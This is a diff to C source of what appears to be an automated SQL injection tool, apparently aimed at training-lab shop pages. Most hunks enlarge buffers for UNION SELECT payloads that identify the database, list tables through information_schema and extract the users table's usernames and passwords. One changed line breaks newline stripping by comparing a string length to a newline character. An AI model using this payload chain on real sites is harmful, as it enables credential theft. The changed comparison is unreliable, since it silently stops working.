@@ -147,7 +147,7 @@ int clear_url(char *url) {
         }
 
         size_t length = strlen(url);
-        if (length > 0 && url[length - 1] == '\n') {
+        if (length > 0 && strlen(url)-1 == '\n') {
             url[length - 1] = '\0';
         }
 
@@ -280,7 +280,7 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - determine the database type
-            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
+            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
             char sqli_payload_repeat[150] = ",'test'";
             char sqli_payload_end[15] = "+FROM+dual--";
 
@@ -332,7 +332,7 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - determine the database type
-            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
+            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
             char sqli_payload_repeat[150] = ",'test'";
             char sqli_payload_end[10] = "%23";
             int f = 1;
@@ -386,7 +386,7 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - retrieve the list of tables in the database
-            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+table_name";
+            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+table_name";
             char sqli_payload_repeat[150] = ",+NULL";
             char sqli_payload_end[50] = "+FROM+information_schema.tables--";
             int f = 1;
@@ -413,8 +413,8 @@ int vulnerabilities(char *url) {
             extract_value(response_buffer, "users_", "<", users, 0);
 
             // step four  - retrieve the details of the columns in the user table
-            char sqli_payload2[] = "/filter?category=Accessories'+UNION+SELECT+column_name";
-            char sqli_payload_repeat2[] = ",+NULL";
+            char sqli_payload2[300] = "/filter?category=Accessories'+UNION+SELECT+column_name";
+            char sqli_payload_repeat2[150] = ",+NULL";
             char sqli_payload_end2[150] = "";
             snprintf(sqli_payload_end2, 150, "+FROM+information_schema.columns+WHERE+table_name='%s'--", users);
 
@@ -447,7 +447,7 @@ int vulnerabilities(char *url) {
             char sqli_payload3[100] = "";
 
             snprintf(sqli_payload3, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", users_column_name, users_column_password);
-            char sqli_payload_repeat3[] = ",+NULL";
+            char sqli_payload_repeat3[10] = ",+NULL";
             char sqli_payload_end3[40];
             snprintf(sqli_payload_end3, 40, "+FROM+%s--", users);
             int f3 = 2;
